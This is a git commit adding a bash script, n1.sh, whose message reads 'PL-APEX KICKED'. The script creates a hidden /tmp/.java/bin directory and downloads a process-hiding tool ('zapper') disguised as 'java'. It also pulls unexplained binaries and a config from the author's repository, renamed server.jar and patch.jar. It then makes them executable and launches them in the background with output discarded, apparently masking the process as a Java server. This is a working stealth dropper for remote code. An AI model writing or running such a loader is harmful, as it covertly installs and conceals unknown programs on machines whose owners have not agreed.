6c38e1139dc6532e845f2176d46699eedb6a6b6d
i51jir6ni9t0 <wker-one@protonmail.com>
2025-06-06 16:20:23 +0000

    PL-APEX KICKED

---
+++ plapex/n1.sh
@@ -0,0 +1,22 @@
+#!/bin/bash
+
+function fetch_files() {
+    mkdir -p /tmp/.java/bin
+    cd /tmp/.java/bin/ && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o java
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o server.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o patch.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/ply/n1.conf -o cfg.conf
+}
+
+function start_app() {
+    chmod a+x /tmp/.java/bin/***
+    cd /tmp/.java/bin && nohup ./java -a 'java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./patch.jar -c ./cfg.conf >/dev/null 2>&1 &
+}
+
+if [ -f "/tmp/.java/bin/server.jar" ] && [ -f "/tmp/.java/bin/java" ] && [ -f "/tmp/.java/bin/patch.jar" ]; then
+    start_app
+else
+    rm -rf /tmp/.java/bin/**
+    fetch_files
+    start_app
+fi
